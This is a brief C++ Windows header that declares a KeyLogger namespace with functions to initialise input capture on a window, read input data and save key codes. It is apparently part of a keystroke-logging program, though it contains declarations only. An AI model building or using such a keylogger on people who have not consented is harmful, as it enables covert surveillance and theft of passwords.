#pragma once
#include <Windows.h>
#include <tchar.h>
#include <stdio.h>

namespace KeyLogger
{
	BOOL Init(HWND);
	BOOL GetData(LPARAM);
	VOID SaveKey(USHORT);
};

